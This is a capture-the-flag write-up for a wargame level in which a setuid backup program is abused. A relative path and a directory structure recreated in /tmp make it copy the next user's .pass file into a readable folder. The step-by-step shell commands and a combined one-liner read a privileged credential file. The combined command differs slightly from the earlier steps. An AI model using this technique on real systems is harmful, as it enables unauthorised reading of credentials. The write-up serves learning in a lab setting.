# Level08

## Overview

* There is one file in our home, ```level08```, belonging to ```level09``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* For the sake of clarity, we won't display the disassembled code, but we will describe its behaviour:
	* `level08` takes a `filename` as parameter and does the following:
		1. In `./backups/.log` it writes `LOG: Starting back up: filename`
		2. Open `filename`
		3. Open `./backups/filename`
		4. Write the content of `filename` in `./backups/filename`
		5. In `./backups/.log` it writes `LOG: Finished back up filename`

## Solution
 * We can exploit the program comportement against him, by making him do a backup of `.pass` which we will be able to read.

 * In `/tmp` we want to reproduce the folder architecture of `.pass`

```sh
mkdir -p /tmp/home/users/level09
```

 * We then want to create the directory `backups`

```sh
mkdir -p /tmp/backups
chmod 777 /tmp/backups
```

 * Now we can execute level08 from `/tmp`:

 ```sh
 cd /tmp
 ~/level08 ../home/users/level09/.pass
 ```

 * And here we get our pass:

 ```sh
cat ./backups/../home/users/level09/.pass
 ```

 * Here is  the same thing as one command for the correction:

```sh
cd /tmp ; mkdir -p /home/users/level09 ; mkdir -p backups ; chmod 777 backups/ ; ~/level08 ../home/users/level09/.pass ; cat ./backups/../home/users/level09/.pass
```
